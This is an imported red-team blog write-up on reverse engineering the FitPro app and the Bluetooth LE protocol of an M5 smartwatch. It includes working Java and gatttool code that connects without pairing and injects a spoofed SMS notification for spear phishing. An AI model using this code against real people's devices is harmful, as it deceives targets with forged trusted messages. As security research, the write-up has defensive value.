---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-20_hacking-smartwatches-for-spear-phishing.md
original_filename: 2022-11-20_hacking-smartwatches-for-spear-phishing.md
title: Hacking Smartwatches for Spear Phishing
category: documents
detected_topics:
- mobile-security
- command-injection
- automation-abuse
- cloud-security
tags:
- imported
- documents
- mobile-security
- command-injection
- automation-abuse
- cloud-security
language: en
raw_sha256: dac679c5ef364a680380d64f46753801f58454ca38073d628c8352f8d5d6f974
text_sha256: 44d2a418bdb51e03a7504ec35214ad082abca099d7e9a5140ec12d33734e53ed
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking Smartwatches for Spear Phishing

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-20_hacking-smartwatches-for-spear-phishing.md
- Source Type: markdown
- Detected Topics: mobile-security, command-injection, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `dac679c5ef364a680380d64f46753801f58454ca38073d628c8352f8d5d6f974`
- Text SHA256: `44d2a418bdb51e03a7504ec35214ad082abca099d7e9a5140ec12d33734e53ed`


## Content

---
title: "Hacking Smartwatches for Spear Phishing"
url: "https://cybervelia.com/?p=1380"
final_url: "https://blog.cybervelia.com/p/hacking-smartwatches-for-spear-phishing"
authors: ["Cybervelia (@cybervelia)"]
bugs: ["IoT", "Phishing", "Android"]
publication_date: "2022-11-20"
added_date: "2022-11-30"
source: "pentester.land/writeups.json"
original_index: 1885
---

#  Hacking Smartwatches for Spear Phishing

### In this article we explain how to hack into a SmartWatch and show a custom text message

[![Theodoros Danos's avatar](https://substackcdn.com/image/fetch/$s_!6lDV!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea9425a3-145e-4077-95a3-d9767d934d11_400x489.jpeg)](https://substack.com/@fand0mas)

[Theodoros Danos](https://substack.com/@fand0mas)

May 17, 2023

1

1

Share

Red teaming is a hard work, and sometimes you have to be creative. The targets may have been phished before through the standard ways and you may need to think out of the box.

In this article we explain how to hack into a SmartWatch and show a custom text message. I won’t delve too much into the Bluetooth Low Energy technology but you can refer [to our previous article for learning the basics](https://cybervelia.com/?p=922).

[![](https://substackcdn.com/image/fetch/$s_!ANOI!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F92c2f1ee-bb7b-47a4-a234-0a1a70315f09_300x300.webp)](https://substackcdn.com/image/fetch/$s_!ANOI!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F92c2f1ee-bb7b-47a4-a234-0a1a70315f09_300x300.webp)

The target is a SmartWatch M5 but the procedure is pretty much the same for all Smartwatches.

## **The Research & Methodology**

### **The Goal**

Modern SmartWatches support showing Smartphone’s messages. Most SmartWatches support multiple text types which among others are WhatsApp, Facebook or SMS messages. The sender’s name or phone number is shown along with their message.

The goal of this task is to have a way to communicate with the SmartWatch and feed it with the right information to show a rogue text message. I believe such phishing attacks work better when the user is in motion. When the target is in a motion does not even look at the SmartPhone to confirm the origin of the message. The users trust the information shown in their SmartWatch thinking it is coming from the SmartWatch. The best part? Most of SmartWatches are insecure and allows adversaries to connect to the SmartWatch and do all kind of things.

The way one could use this attack may seem limited but it is actually very powerful if put in the right context.

### **The Research – Reverse Engineering the app**

Unfortunately for us, each and every SmartWatch is doing things differently. Each vendor implements their own logic and their own protocol; thus for each brand/model we need to do some research first. So let’s get started. We need to install gatttool into a linux machine and have standard BLE dongle.

To connect and discover the characteristics we used a BLE dongle and standard Linux tools such as gatttool.
  
  
  gatttool -t public -b ff:ff:df:10:8d:f9 -I
  [ff:ff:df:10:8d:f9][LE]> characteristics
  handle: 0x0002, char properties: 0x12, char value handle: 0x0003, uuid: 00002a00-0000-1000-8000-00805f9b34fb
  handle: 0x0004, char properties: 0x02, char value handle: 0x0005, uuid: 00002a01-0000-1000-8000-00805f9b34fb
  handle: 0x0006, char properties: 0x02, char value handle: 0x0007, uuid: 00002a04-0000-1000-8000-00805f9b34fb
  handle: 0x0009, char properties: 0x20, char value handle: 0x000a, uuid: 00002a05-0000-1000-8000-00805f9b34fb
  handle: 0x000d, char properties: 0x02, char value handle: 0x000e, uuid: 00002a50-0000-1000-8000-00805f9b34fb
  handle: 0x000f, char properties: 0x02, char value handle: 0x0010, uuid: 00002a26-0000-1000-8000-00805f9b34fb
  handle: 0x0011, char properties: 0x02, char value handle: 0x0012, uuid: 00002a28-0000-1000-8000-00805f9b34fb
  handle: 0x0015, char properties: 0x06, char value handle: 0x0016, uuid: 00002a4e-0000-1000-8000-00805f9b34fb
  handle: 0x0017, char properties: 0x12, char value handle: 0x0018, uuid: 00002a22-0000-1000-8000-00805f9b34fb
  handle: 0x001a, char properties: 0x0e, char value handle: 0x001b, uuid: 00002a32-0000-1000-8000-00805f9b34fb
  handle: 0x001c, char properties: 0x12, char value handle: 0x001d, uuid: 00002a4d-0000-1000-8000-00805f9b34fb
  handle: 0x0020, char properties: 0x12, char value handle: 0x0021, uuid: 00002a4d-0000-1000-8000-00805f9b34fb
  handle: 0x0024, char properties: 0x0e, char value handle: 0x0025, uuid: 00002a4d-0000-1000-8000-00805f9b34fb
  handle: 0x0027, char properties: 0x02, char value handle: 0x0028, uuid: 00002a4b-0000-1000-8000-00805f9b34fb
  handle: 0x002a, char properties: 0x02, char value handle: 0x002b, uuid: 00002a4a-0000-1000-8000-00805f9b34fb
  handle: 0x002c, char properties: 0x04, char value handle: 0x002d, uuid: 00002a4c-0000-1000-8000-00805f9b34fb
  handle: 0x002f, char properties: 0x10, char value handle: 0x0030, uuid: 6e400003-b5a3-f393-e0a9-e50e24dcca9d
  handle: 0x0032, char properties: 0x0c, char value handle: 0x0033, uuid: 6e400002-b5a3-f393-e0a9-e50e24dcca9d
  handle: 0x0035, char properties: 0x12, char value handle: 0x0036, uuid: 00002a19-0000-1000-8000-00805f9b34fb
  handle: 0x0039, char properties: 0x06, char value handle: 0x003a, uuid: 00010203-0405-0607-0809-0a0b0c0d2b12

We’ll have to decompile the SmartWatche’s mobile application to understand the custom BLE protocol. To do that we use Jadx which is a great decompiler and supports APK files out of the box.

The application is called FitPro and here how it looks like:

[![](https://substackcdn.com/image/fetch/$s_!2RdA!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b56d99f-d062-443e-8f0a-fe18ba46ba07_473x1024.jpeg)](https://substackcdn.com/image/fetch/$s_!2RdA!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b56d99f-d062-443e-8f0a-fe18ba46ba07_473x1024.jpeg)FitPro Android App

Through some code digging the notification handling class is found. This class is responsible for receiving SMS messages from Android and passing them over to the SmartWatch. Since this isn’t a reverse engineering write-up I won’t delve too much into the details of the task, however I will mention the findings.

The class is called “NotifyService” and through some other classes’ methods invocation it is able to construct a BLE message and forward it to the device.

Here is the packet construction:

[![](https://substackcdn.com/image/fetch/$s_!y0sm!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb68271df-7dfe-4bc6-9045-b2e73940c351_549x81.png)](https://substackcdn.com/image/fetch/$s_!y0sm!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb68271df-7dfe-4bc6-9045-b2e73940c351_549x81.png)Custom PDU Format

The phone/source is the origin of the message and it’s a string. It can be anything really.

The phone is then followed by a colon and then a message.

The Message Packet Header is just 3 bytes and defines the type of the message.

Here how the type is defined, shown from the decompiled code:
  
  
  case 5:
  str3 = SaveKeyValues.getStringValues("SMSState", str3);
  obj = new byte[]{(byte) 1, (byte) 0, (byte) 0};
  break;
  ... SNIP ...
  case 11:
  str3 = SaveKeyValues.getStringValues("FaceBookState", str3);
  obj = new byte[]{(byte) 4, (byte) 0, (byte) 0};
  break;
  case 12:
  str3 = SaveKeyValues.getStringValues("linkdedInState", str3);
  obj = new byte[]{(byte) 17, (byte) 0, (byte) 0};
  break;
  case 13:
  str3 = SaveKeyValues.getStringValues("KakaoTalkState", str3);
  obj = new byte[]{(byte) 9, (byte) 0, (byte) 0};
  break;
  default:

Therefore, for SMS messages the bytes {1,0,0} are used.

The protocol header is defined by two variable numbers which are actually based on the length of the data. Therefore, the message’s length is included.

This is how the protocol’s header is constructed (Don’t overthink about it):
  
  
  public static byte[] getProtocol(byte b, byte b2, byte[] bArr) {
  Integer valueOf = Integer.valueOf(getLength().intValue() + bArr.length);
  Object obj = new byte[valueOf.intValue()];
  obj[0] = (byte) -51;
  Object intToBytes = ByteUtil.intToBytes(valueOf.intValue() - 3);
  System.arraycopy(intToBytes, 2, obj, 1, intToBytes.length - 2);
  obj[3] = b;
  obj[4] = 1;
  obj[5] = b2;
  Object intToBytes2 = ByteUtil.intToBytes(bArr.length);
  System.arraycopy(intToBytes2, 2, obj, 6, intToBytes2.length - 2);
  System.arraycopy(bArr, 0, obj, 8, bArr.length);
  return obj;
  }

The NotifyService class leads also the the characteristic’s UUID (6e400002-b5a3-f393-e0a9-e50e24dcca9d) and therefore to its value handle (0x33).

Now we have a complete picture of how to send data to the SmartWatch. We’ ll now construct the code to send data to the device. We selected Java as we make use part of the decompiled code to construct the packet.

## **Re-constructing the Packet**

Let’s construct the message and the message’s header:
  
  
  static byte[] constructMessage(String phone, String msg) {
  ByteBuffer buffer = ByteBuffer.allocate(3 + msg.length() + 1 + phone.length());
  buffer.put(new byte[]{1,0,0});
  buffer.put(phone.getBytes());
  buffer.put((byte) 58); // colon
  buffer.put(msg.getBytes());
  return buffer.array();
  }

We transfer the function getProtocol from the decompiled code, and then renaming some variables for clarity as well as altering some functions to match Java’s API:
  
  
  public static byte[] getProtocol(byte b, byte b2, byte[] bArr) {
  Integer intBarrAndIntLen = Integer.valueOf(getLength().intValue() + bArr.length);
  byte[] payload = new byte[intBarrAndIntLen.intValue()];
  payload[0] = (byte) -51;
  byte[] byteOfIntBarrALenMinus3 = ByteBuffer.allocate(8).putInt(intBarrAndIntLen.intValue() - 3).array();
  System.arraycopy(byteOfIntBarrALenMinus3, 2, payload, 1, byteOfIntBarrALenMinus3.length - 2);
  payload[3] = b;
  payload[4] = 1;
  payload[5] = b2;
  byte[] intToBytes2 = ByteBuffer.allocate(4).putInt(bArr.length).array();
  System.arraycopy(intToBytes2, 2, payload, 6, intToBytes2.length - 2);
  System.arraycopy(bArr, 0, payload, 8, bArr.length);
  return payload;
  }

The input of the method is given by the following method:
  
  
  public static byte[] getSendPushRemindValue(int i, byte[] bArr) {
  return getProtocol((byte) 18, i == 1 ? (byte) 18 : (byte) 17, bArr);
  }

How we make use of the method getProtocol:
  
  
  byte[] data = getProtocol((byte)18, (byte)18, constructMessage("Helen", "I need help. 2nd floor"));

Since the default MTU of BLE allows 20 bytes to be sent the custom protocol’s message is split in two and therefore two BLE packets are used to transfer the custom PDU from the app to the SmartWatch.

## **Sending the custom message**

Now we have all the necessary information to construct a valid message. So let’s connect and send it to the SmartWatch. To do that we make use of tool BLE:bit (blebit.io), but any other tool could be used really.
  
  
  short chr_handle = 0x33;
  
  // Create a controller object
  CEController ce = BLEHelper.getCentralController(new CEBLEDeviceCallbackHandler());
  if (ce == null) {
  System.err.println("BLE:bit CE tool not found");
  }
  
  // Initialize the BLE tool
  ce.sendConnectionParameters(new CEConnectionParameters());
  ce.sendBluetoothDeviceAddress("ff:55:ee:fe:4a:af", ConnectionTypesCommon.BITAddressType.STATIC_PRIVATE);
  ce.configurePairing(ConnectionTypesCommon.PairingMethods.NO_IO, null);
  ce.finishSetup();
  
  System.out.println("Searching for the target");
  
  // Connect to the target
  ce.connectNow("ff:ff:df:10:8d:f9", ConnectionTypesCommon.AddressType.PUBLIC_ADDR);
  
  System.out.println("Connected");
  
  // Send data to the device
  byte[] data = getProtocol((byte)18, (byte)18, constructMessage("Helen", "I need help. 2nd floor"));
  
  if (data.length <= 20) {
  sendData(ce, data, chr_handle);
  }else {
  byte[] first_packet = Arrays.copyOfRange(data, 0, 20);
  byte[] second_packet = Arrays.copyOfRange(data, 20, data.length);
  
  sendData(ce, first_packet, chr_handle);
  sendData(ce, second_packet, chr_handle);
  }
  
  // Disconnect and terminate the session
  ce.disconnect(19);
  ce.terminate();
  
  System.out.println("Terminated");

The program is constructing a message having the sender’s name to be “Helen” and the message body to be “I need help. 2nd floor”.

[![](https://substackcdn.com/image/fetch/$s_!atGA!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F429d6d02-18f6-4ec5-8feb-7749cbd502ba_517x800.jpeg)](https://substackcdn.com/image/fetch/$s_!atGA!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F429d6d02-18f6-4ec5-8feb-7749cbd502ba_517x800.jpeg)Pwned

## **Do you own a product?**

Let's schedule a consultation to identify your potential attack vectors. From there, we can strategize a comprehensive testing plan aimed at fortifying your product against vulnerabilities, thereby safeguarding both your user base and infrastructure from malicious activities.

[Book a Pentest](https://cybervelia.com/penetration-testing)

1

1

Share
